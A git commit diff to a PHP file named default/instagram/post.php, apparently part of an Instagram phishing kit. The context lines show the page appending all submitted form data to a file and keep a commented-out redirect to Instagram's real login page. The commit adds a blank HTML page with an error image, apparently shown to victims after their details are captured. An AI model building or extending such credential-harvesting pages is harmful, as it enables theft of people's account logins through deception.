f912ab2e68f078c9833eddf5998f8f1dbd2f71f8
mak <makindosx@gmail.com>
2019-11-11 17:53:59 +0200

    Add files via upload

--- default/instagram/post.php
+++ default/instagram/post.php
@@ -25,3 +25,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 ?>
 
 <!-- <meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/?hl=en"/> -->
+
+
+<html>
+<head>
+</head>
+<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
+</body>
+</html>
